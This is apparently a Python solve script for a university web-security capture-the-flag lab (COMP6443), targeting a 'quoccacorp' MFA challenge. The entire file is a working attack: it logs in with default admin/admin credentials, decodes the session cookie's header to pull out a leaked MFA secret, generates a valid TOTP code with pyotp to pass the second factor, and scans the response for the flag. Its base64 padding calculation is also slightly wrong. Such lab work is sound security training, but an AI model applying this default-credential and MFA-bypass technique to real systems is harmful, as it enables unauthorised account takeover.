import requests
import re
import base64
import json
import pyotp

session = requests.Session()
session.cert = "../../z5437741.pem"

BASE_URL = "https://mfa-v2.quoccacorp.com"

FLAG_PATTERN = r"(COMP6443{.+?})"
def find_flag(text: str, flag_pattern=FLAG_PATTERN):
    if flag_match := re.search(flag_pattern, text):
        flag = flag_match.group(1)
        print(f"\n🚩 FLAG FOUND 🚩\n{flag}" * 10)
        exit()

def main():
    session.post(
        BASE_URL + "/login",
        data={"username": "admin", "password": "admin"}
    )

    token = session.cookies.get("session")
    token_header = token.split('.')[0]
    token_header_padded = token_header + '=' * (len(token_header) % 4)
    token_header_decoded = base64.b64decode(token_header_padded).decode()
    token_header_json: dict[str, str] = json.loads(token_header_decoded)

    mfa_secret = token_header_json.get("mfa_secret")
    totp = pyotp.TOTP(mfa_secret)

    response = session.post(
        BASE_URL + "/mfa",
        data={"code": totp.now()}
    )

    find_flag(response.text)

if __name__ == "__main__":
    main()